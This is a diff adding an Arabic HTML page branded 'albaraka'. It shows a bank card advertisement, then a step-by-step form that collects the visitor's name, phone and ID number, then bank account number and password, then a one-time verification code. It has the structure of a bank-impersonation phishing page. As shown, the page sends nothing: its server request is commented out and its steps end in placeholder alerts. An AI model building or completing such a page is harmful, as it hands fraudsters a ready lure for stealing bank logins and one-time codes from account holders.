@@ -1,0 +1,225 @@
+<!doctype html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"/>
+  <title>تسجيل - عرض إعلان البطاقة</title>
+  <style>
+    :root{
+      --bg:#fff;
+      --card:#fff;
+      --accent:#ff5a2e; /* لون الزر الأحمر/برتقالي مشابه */
+      --accent-dark:#d93b1f;
+      --muted:#777;
+      --radius:14px;
+      --width:390px;
+    }
+    html,body{height:100%;margin:0;font-family:Inter, "Segoe UI", Tahoma, Arial;direction:rtl;background:#f2f3f5;-webkit-font-smoothing:antialiased}
+    /* SPLASH fullscreen mobile */
+    .splash{
+      position:fixed;inset:0;display:flex;align-items:center;justify-content:center;
+      background:linear-gradient(180deg,#fff,#fbfbfb);z-index:30;transition:opacity .5s,visibility .5s;
+    }
+    .splash.hidden{opacity:0;visibility:hidden;pointer-events:none}
+    .splash .frame{
+      width:100%;max-width:420px;border-radius:20px;overflow:hidden;box-shadow:0 18px 60px rgba(0,0,0,.12);
+      position:relative;
+    }
+    .splash img{display:block;width:100%;height:100%;object-fit:cover}
+
+    /* main form container (mobile card centered) */
+    .app{
+      min-height:100%;display:flex;align-items:center;justify-content:center;padding:20px;
+    }
+    .panel{
+      width:100%;max-width:420px;background:var(--card);border-radius:18px;padding:18px;box-shadow:0 10px 30px rgba(0,0,0,.06);
+      box-sizing:border-box;
+    }
+    .logo{height:44px;display:block;margin:6px auto 12px}
+    h1{font-size:20px;margin:6px 0;color:#222;text-align:center}
+    .desc{font-size:13px;color:var(--muted);text-align:center;margin-bottom:12px}
+
+    label{display:block;text-align:right;font-size:13px;color:#333;margin-top:10px}
+    input[type="text"], input[type="password"], input[type="tel"]{
+      width:100%;padding:12px;border-radius:12px;border:1px solid #eee;margin-top:6px;font-size:15px;box-sizing:border-box;
+      background:#fff;
+    }
+    .btn{
+      display:block;width:100%;padding:12px;border-radius:12px;border:0;background:linear-gradient(90deg,var(--accent),var(--accent-dark));
+      color:#fff;font-weight:700;font-size:16px;cursor:pointer;margin-top:14px;
+      box-shadow:0 8px 18px rgba(255,90,46,.18);
+    }
+    .muted-center{font-size:13px;color:var(--muted);text-align:center;margin-top:10px}
+    .steps{position:relative;min-height:260px}
+    .step{display:none}
+    .step.active{display:block}
+
+    /* OTP input row */
+    .otp{display:flex;gap:10px;justify-content:center;margin-top:12px}
+    .otp input{width:54px;height:54px;border-radius:10px;border:1px solid #eee;font-size:20px;text-align:center}
+
+    /* small footer like الصورة */
+    .logos-row{display:flex;gap:8px;align-items:center;justify-content:center;margin-top:14px}
+    .small-flag{height:14px}
+    @media(min-width:720px){
+      body{background:#e9ebee}
+      .splash .frame{max-width:420px}
+    }
+  </style>
+</head>
+<body>
+
+  <!-- شاشة الإعلان (الصورة العمودية التي أرسلتها) -->
+  <div id="splash" class="splash" aria-hidden="false">
+    <div class="frame" role="img" aria-label="إعلان البطاقة">
+      <img src="splash-mobile.jpg" alt="إعلان البطاقة">
+    </div>
+  </div>
+
+  <!-- تطبيق / نموذج متعدد الخطوات -->
+  <main class="app" aria-live="polite">
+    <div class="panel" role="form">
+      <img src="albaraka-logo.png" alt="albaraka" class="logo">
+
+      <div class="steps">
+
+        <!-- خطوة 1: معلومات شخصية -->
+        <section id="step1" class="step active">
+          <h1>تسجيل المعلومات</h1>
+          <p class="desc">أدخل اسمك ورقم الهاتف ورقم الهوية</p>
+
+          <label for="name">الاسم</label>
+          <input id="name" type="text" placeholder="الاسم الكامل" autocomplete="name">
+
+          <label for="phone">رقم الهاتف</label>
+          <input id="phone" type="tel" placeholder="09xxxxxxxx" inputmode="tel" autocomplete="tel">
+
+          <label for="idnum">رقم الهوية / الجواز</label>
+          <input id="idnum" type="text" placeholder="الهوية أو الجواز" autocomplete="off">
+
+          <button id="btnToAcc" class="btn">متابعة</button>
+          <div class="muted-center">بياناتك آمنة ومحمية</div>
+        </section>
+
+        <!-- خطوة 2: تفاصيل الحساب -->
+        <section id="step2" class="step">
+          <h1>تفاصيل الحساب</h1>
+          <p class="desc">أدخل رقم الحساب وكلمة المرور</p>
+
+          <label for="account">رقم الحساب</label>
+          <input id="account" type="text" placeholder="مثال: 1234567890" autocomplete="username">
+
+          <label for="password">كلمة المرور</label>
+          <input id="password" type="password" placeholder="كلمة المرور" autocomplete="current-password">
+
+          <button id="btnToOTP" class="btn">متابعة</button>
+          <div class="muted-center">اضغط متابعة لإرسال رمز التفعيل إلى هاتفك</div>
+        </section>
+
+        <!-- خطوة 3: رمز التفعيل -->
+        <section id="step3" class="step">
+          <h1>أدخل رمز التفعيل</h1>
+          <p class="desc">أرسلنا رمزًا إلى رقم الهاتف</p>
+
+          <div class="otp" aria-label="حقل رمز التفعيل">
+            <input maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*" aria-label="رقم 1">
+            <input maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*" aria-label="رقم 2">
+            <input maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*" aria-label="رقم 3">
+            <input maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*" aria-label="رقم 4">
+          </div>
+
+          <button id="btnVerify" class="btn">تأكيد</button>
+          <div class="muted-center">لم تستلم؟ <a href="#" id="resend">إعادة إرسال</a></div>
+        </section>
+
+      </div>
+
+      <div class="logos-row">
+        <!-- صف أيقونات/شعارات مشابهة للجزء السفلي بالصورة -->
+        <img src="secure-icon.png" alt="" style="height:18px;opacity:.9">
+        <img src="globe-icon.png" alt="" style="height:18px;opacity:.9">
+        <img src="phone-icon.png" alt="" style="height:18px;opacity:.9">
+      </div>
+
+    </div>
+  </main>
+
+  <script>
+    const SHOW_MS = 3000;
+    const splash = document.getElementById('splash');
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+
+    // إخفاء الـ splash بعد 3 ثوان
+    window.addEventListener('load', ()=> {
+      const img = splash.querySelector('img');
+      if (!img.complete) { img.addEventListener('load', startTimer); img.addEventListener('error', startTimer); }
+      else startTimer();
+    });
+    function startTimer(){ setTimeout(()=> { splash.classList.add('hidden'); splash.setAttribute('aria-hidden','true'); }, SHOW_MS); }
+
+    // التنقل بين الخطوات
+    function showStep(n){
+      step1.classList.remove('active'); step2.classList.remove('active'); step3.classList.remove('active');
+      if (n===1) step1.classList.add('active');
+      if (n===2) step2.classList.add('active');
+      if (n===3) step3.classList.add('active');
+    }
+
+    document.getElementById('btnToAcc').addEventListener('click', ()=>{
+      const name = document.getElementById('name').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const idnum = document.getElementById('idnum').value.trim();
+      if (!name || !phone || !idnum) { alert('الرجاء ملء جميع الحقول'); return; }
+      // هنا يمكنك التحقق من صحة الهاتف/الهوية أو حفظ البيانات محلياً/إرسالها للسيرفر
+      showStep(2);
+      document.getElementById('account').focus();
+    });
+
+    document.getElementById('btnToOTP').addEventListener('click', ()=>{
+      const acc = document.getElementById('account').value.trim();
+      const pw = document.getElementById('password').value;
+      if (!acc || !pw) { alert('الرجاء إدخال رقم الحساب وكلمة المرور'); return; }
+      // إرسال طلب للسيرفر لبدء جلسة/إرسال OTP (مثال):
+      // fetch('/api/send-otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({account:acc})})
+      showStep(3);
+      setTimeout(()=> document.querySelector('.otp-input').focus(), 120);
+    });
+
+    // تعامل مع حقول OTP: التنقل التلقائي
+    const otpInputs = Array.from(document.querySelectorAll('.otp-input'));
+    otpInputs.forEach((el, i) => {
+      el.addEventListener('input', (e)=>{
+        const v = e.target.value;
+        if (v.length>1) e.target.value = v.slice(0,1);
+        if (v && otpInputs[i+1]) otpInputs[i+1].focus();
+      });
+      el.addEventListener('keydown', (e)=>{
+        if (e.key === 'Backspace' && !e.target.value && otpInputs[i-1]) otpInputs[i-1].focus();
+      });
+    });
+
+    document.getElementById('btnVerify').addEventListener('click', ()=>{
+      const code = otpInputs.map(i=>i.value).join('');
+      if (code.length < 4) { alert('أدخل رمز التفعيل بالكامل'); return; }
+      // تحقق من الكود مع السيرفر
+      alert('تم التحقق (مثال).');
+    });
+
+    document.getElementById('resend').addEventListener('click',(e)=>{ e.preventDefault(); alert('تم إعادة إرسال الكود (مثال).'); });
+
+    // للتمثيل: السماح بالعودة للخطوة السابقة عبر زر Back في المتصفح
+    let current = 1;
+    function updateCurrent(n){ current = n; history.replaceState({step:n}, '', '#step'+n); }
+    ['btnToAcc','btnToOTP','btnVerify'].forEach(()=>{}); // placeholder
+    // تعيين الأحداث لتحديث current
+    document.getElementById('btnToAcc').addEventListener('click', ()=> updateCurrent(2));
+    document.getElementById('btnToOTP').addEventListener('click', ()=> updateCurrent(3));
+    document.getElementById('btnVerify').addEventListener('click', ()=> updateCurrent(3));
+    window.addEventListener('popstate', (e)=> {
+      const s = (e.state && e.state.step) || 1; showStep(s);
+    });
+  </script>
+</body>
+</html>
